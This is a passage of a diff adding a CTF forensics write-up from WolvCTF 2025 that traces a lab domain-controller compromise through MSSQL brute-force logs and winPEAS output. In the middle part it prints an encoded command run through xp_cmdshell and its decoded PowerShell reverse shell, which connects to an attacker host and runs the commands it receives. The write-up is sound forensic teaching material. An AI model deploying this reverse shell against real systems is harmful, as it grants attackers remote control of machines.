+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="898"
+        height="1386"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250324175946_hu3626233610827543944.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250324175946_hu18210521464126330349.png 330w,/posts/wolvctf-2025/Pasted_image_20250324175946_hu3626233610827543944.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324175946.png 898w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324175946.png 898w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="challenge-description-3" class="relative group">Challenge Description <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#challenge-description-3" aria-label="Anchor">#</a></span></h3><p>Oh no! Our beloved <code>wolvctf.corp</code> domain has been infiltrated! How did they manage to break into our domain controller? Please figure out how they got access into the domain controller box, how a shell was achieved, and how a domain account was obtained.</p>
+<p>We have provided just the user accounts because the attacker did not cover their tracks very well.</p>
+<p><code>Users_Backup.zip</code>&rsquo;s password is <code>wolvctf</code></p>
+<p><code>sha256sum:709b595d63ac9660b9c67de357337ee55ffd6658412b8c5c27b35efc05617893</code></p>
+<p><em>Flag is split up into 3 parts.</em></p>
+<p><a href="https://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing" target="_blank" rel="noreferrer">https://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing</a></p>
+<h3 id="solve-3" class="relative group">Solve <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#solve-3" aria-label="Anchor">#</a></span></h3><h4 id="part-1---infiltration" class="relative group">Part 1 - Infiltration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#part-1---infiltration" aria-label="Anchor">#</a></span></h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ cat mssql_service/MSSQL13.SQLEXPRESS/MSSQL/Log/ERRORLOG
+</span></span></span><span class="line"><span class="cl"><span class="go">��2025-03-18 12:28:55.12 Server      Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) 
+</span></span></span><span class="line"><span class="cl"><span class="go">        Mar 18 2018 09:11:49 
+</span></span></span><span class="line"><span class="cl"><span class="go">        Copyright (c) Microsoft Corporation
+</span></span></span><span class="line"><span class="cl"><span class="go">        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 &lt;X64&gt; (Build 17763: ) (Hypervisor)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">2025-03-18 12:28:55.13 Server      UTC adjustment: -7:00
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">2025-03-18 12:29:14.04 Server      Software Usage Metrics is disabled.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 13:28:27.74 spid52      Using &#39;dbghelp.dll&#39; version &#39;4.0.5&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:14.50 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:14.50 Logon       Login failed for user &#39;root&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:15.13 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:15.13 Logon       Login failed for user &#39;test&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:15.74 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:15.74 Logon       Login failed for user &#39;admin&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:16.32 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:16.32 Logon       Login failed for user &#39;bruteforcing&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:17.00 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:17.00 Logon       Login failed for user &#39;this&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:17.85 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:17.85 Logon       Login failed for user &#39;is&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:18.43 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:18.43 Logon       Login failed for user &#39;the&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:19.05 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:19.05 Logon       Login failed for user &#39;first&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:19.69 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:19.69 Logon       Login failed for user &#39;part&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:20.31 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:20.31 Logon       Login failed for user &#39;w&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:20.86 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:20.86 Logon       Login failed for user &#39;c&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:21.68 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:21.68 Logon       Login failed for user &#39;t&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:22.30 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:22.30 Logon       Login failed for user &#39;f&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:23.12 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:23.12 Logon       Login failed for user &#39;{&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:23.96 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:23.96 Logon       Login failed for user &#39;d&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:24.56 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:24.56 Logon       Login failed for user &#39;0&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:25.22 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:25.22 Logon       Login failed for user &#39;n&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:25.82 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:25.82 Logon       Login failed for user &#39;t&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:26.49 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:26.49 Logon       Login failed for user &#39;_&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:27.21 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:27.21 Logon       Login failed for user &#39;3&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:27.93 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:27.93 Logon       Login failed for user &#39;n&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:28.60 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:28.60 Logon       Login failed for user &#39;4&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:29.11 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:29.11 Logon       Login failed for user &#39;b&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:29.64 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:29.64 Logon       Login failed for user &#39;l&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:30.29 Logon       Error: 18456, Severity: 14, State: 5.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:30.29 Logon       Login failed for user &#39;3&#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:55.62 spid54      Configuration option &#39;show advanced options&#39; changed from 1 to 1. Run the RECONFIGURE statement to install.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:55.63 spid54      Configuration option &#39;xp_cmdshell&#39; changed from 1 to 1. Run the RECONFIGURE statement to install.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:58.29 spid54      Configuration option &#39;xp_cmdshell&#39; changed from 1 to 0. Run the RECONFIGURE statement to install.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 19:51:58.33 spid54      Configuration option &#39;show advanced options&#39; changed from 1 to 0. Run the RECONFIGURE statement to install.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 21:14:25.14 spid5s      SQL Server is terminating in response to a &#39;stop&#39; request from Service Control Manager. This is an informational message only. No user action is required.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 21:14:26.61 spid13s     Service Broker manager has shut down.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 21:14:26.65 spid5s      .NET Framework runtime has been stopped.
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 21:14:27.51 spid5s      SQL Server shutdown has been initiated
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-03-18 21:14:27.53 spid5s      SQL Trace was stopped due to server shutdown. Trace ID = &#39;1&#39;. This is an informational message only; no user action is required.
+</span></span></span><span class="line"><span class="cl"><span class="go">                                 
+</span></span></span></code></pre></div><p>If we look at the invalid logons, we can see the attacker trying to brute force credentials. This spells out the first part of the flag,</p>
+<pre tabindex="0"><code>wctf{d0nt_3n4bl3_
+</code></pre><hr>
+<h4 id="part-2---shell-access" class="relative group">Part 2 - Shell Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#part-2---shell-access" aria-label="Anchor">#</a></span></h4><pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cat Public/Documents/winPEASOutput.txt                 
+��ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run &#39;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#39; and then start a new CMD
+Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1&#39; and then start a new CMD
+
+...
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319003712_hu8253463876567749022.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319003712_hu1095597603361298607.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003712_hu2450495346306792754.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003712_hu2605609980283344387.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3830"
+        height="2392"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319003712_hu3505889092747329341.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319003712_hu3619014628315243678.png 330w,/posts/wolvctf-2025/Pasted_image_20250319003712_hu3505889092747329341.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003712_hu2232931960657495587.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003712_hu17185336127076151349.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Lets check the processes information in winpeas to see if any <code>XP_CMDSHELl</code> commands were run by the MSSQL user:</p>
+<pre tabindex="0"><code>P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%c% Processes Information `%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%                                                                                                   
+
+T%P%P%P%P%P%P%P%P%P%P%c% Interesting Processes -non Microsoft-
+Z% Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes                                                         
+    conhost(7856)[C:\Windows\system32\conhost.exe] -- POwn: MSSQL$SQLEXPRESS
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    cmd(1620)[C:\Windows\system32\cmd.exe] -- POwn: MSSQL$SQLEXPRESS
+    Command Line: &#34;C:\Windows\system32\cmd.exe&#34; /c powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAOAA3AC4AMQAyADgAIgAsADEANAAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAIAA9ACAAIgBYADMAaABRAFgAMgBOAHQAWgBIAE4AbwBNAHoARQB4AFgAMwBjAHgAZABHAGgAZgBaAEQATgBtAFkAWABWAHMAZABGADkAagBjAGoATgBrAGMAMQA4AHcAYwBsADgAPQBzACIAOwAkAGYAbABhAGcAcAB0ADIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAKQApADsAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGYAbABhAGcAcAB0ADIAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==                                                                         
+   =================================================================================================                                   
+
+    winPEASx64(8144)[C:\Users\Public\Documents\winPEASx64.exe] -- POwn: MSSQL$SQLEXPRESS -- isDotNet
+    Permissions: MSSQL$SQLEXPRESS [AllAccess], Service [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public\Documents (Service [WriteData/CreateFiles])
+    Command Line: &#34;C:\Users\Public\Documents\winPEASx64.exe&#34; all
+   ================================================================================                    
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319003017_hu17371743969523194355.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319003017_hu11319431077110331055.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003017_hu4415866806937817331.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003017_hu17204594232645394998.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3836"
+        height="2398"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319003017_hu17178622487681594644.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319003017_hu14435546095886175063.png 330w,/posts/wolvctf-2025/Pasted_image_20250319003017_hu17178622487681594644.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003017_hu4996029461906421241.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003017_hu14031465515088737140.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>to decode <a href="https://cyberchef.org/#recipe=From_Base64%28%27A-Za-z0-9%2B/%3D%27,true,false%29Decode_text%28%27UTF-16LE%20%281200%29%27%29" target="_blank" rel="noreferrer">https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)')</a></p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319003308_hu13014116364523357048.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319003308_hu10490032219081258505.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003308_hu14225396641893869669.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003308_hu6260825170431568937.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2776"
+        height="1488"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319003308_hu350163976868915900.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319003308_hu11268157707639633021.png 330w,/posts/wolvctf-2025/Pasted_image_20250319003308_hu350163976868915900.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003308_hu11650832923159363740.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003308_hu7847118972436740675.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s2">&#34;192.168.187.128&#34;</span><span class="p">,</span><span class="mf">1433</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="py">GetStream</span><span class="p">();[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.65535</span><span class="p">|%{</span><span class="mf">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="mf">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="py">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&#34;PS &#34;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="py">Path</span> <span class="p">+</span> <span class="s2">&#34;&gt; &#34;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">).</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$encoded_flagpt2</span> <span class="p">=</span> <span class="s2">&#34;X3hQX2NtZHNoMzExX3cxdGhfZDNmYXVsdF9jcjNkc18wcl8=s&#34;</span><span class="p">;</span><span class="nv">$flagpt2</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetString</span><span class="p">([</span><span class="no">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$encoded_flagpt2</span><span class="p">));</span><span class="nb">Write-Output</span> <span class="nv">$flagpt2</span><span class="p">;</span><span class="nv">$stream</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="py">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
+</span></span></code></pre></div><p>We can see the <code>flagpart2</code> variable in there</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319003407_hu18035137080787856598.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319003407_hu10037759912165101720.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003407_hu6400783444803386597.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003407_hu3463911764820118248.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2568"
+        height="1414"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319003407_hu13459564696208877292.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319003407_hu6988315572054988609.png 330w,/posts/wolvctf-2025/Pasted_image_20250319003407_hu13459564696208877292.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003407_hu1376395281930268366.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003407_hu9319884581748257119.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Flag part 2:</p>
+<pre tabindex="0"><code>_xP_cmdsh311_w1th_d3fault_cr3ds_0r_
+</code></pre><hr>
+<h4 id="part-3---getting-a-domain-user" class="relative group">Part 3 - Getting a domain user <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#part-3---getting-a-domain-user" aria-label="Anchor">#</a></span></h4><p>Read winpeas output again</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cat Public/Documents/winPEASOutput.txt                 
+��ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run &#39;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#39; and then start a new CMD
+Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1&#39; and then start a new CMD
+
+...
